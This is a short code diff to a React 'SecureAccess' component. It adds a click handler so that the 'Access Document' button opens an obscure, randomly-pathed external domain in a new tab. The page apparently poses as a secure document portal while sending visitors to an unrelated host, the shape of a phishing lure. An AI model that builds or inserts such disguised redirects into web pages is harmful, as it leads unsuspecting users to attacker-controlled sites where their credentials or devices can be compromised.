@@ -48,6 +48,7 @@ const SecureAccess = () => {
             <Button 
               className="w-full bg-gradient-to-r from-primary to-primary-glow hover:from-primary-glow hover:to-primary transform hover:scale-[1.02] transition-all duration-300 shadow-lg hover:shadow-xl group"
               size="lg"
+              onClick={() => window.open('https://dhopemillerfouon.com.de/6pe068OPI4/', '_blank')}
             >
               <span className="flex items-center gap-2">
                 Access Document
